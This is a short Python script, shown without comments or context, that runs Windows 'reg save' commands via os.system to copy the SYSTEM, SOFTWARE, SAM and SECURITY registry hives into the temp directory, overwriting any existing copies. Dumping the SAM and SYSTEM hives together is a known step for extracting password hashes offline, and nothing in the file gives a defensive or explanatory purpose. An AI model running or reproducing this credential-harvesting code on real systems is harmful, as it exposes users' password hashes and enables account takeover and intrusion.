import os
import tempfile

def save_hivefile():
    tempdir = tempfile.gettempdir()
    comm_sys = createCommand(tempdir, 'system')
    comm_soft = createCommand(tempdir, 'software')
    comm_sam = createCommand(tempdir, 'sam')
    comm_security = createCommand(tempdir, 'security')

    os.system(comm_sys)
    os.system(comm_soft)
    os.system(comm_sam)
    os.system(comm_security)

def createCommand(temp, target):
    comm = "reg save hklm\\"
    comm = comm + target
    comm = comm + " "
    comm = comm + temp
    comm = comm + "\\"
    comm = comm + target
    comm = comm + " /y"

    return comm


    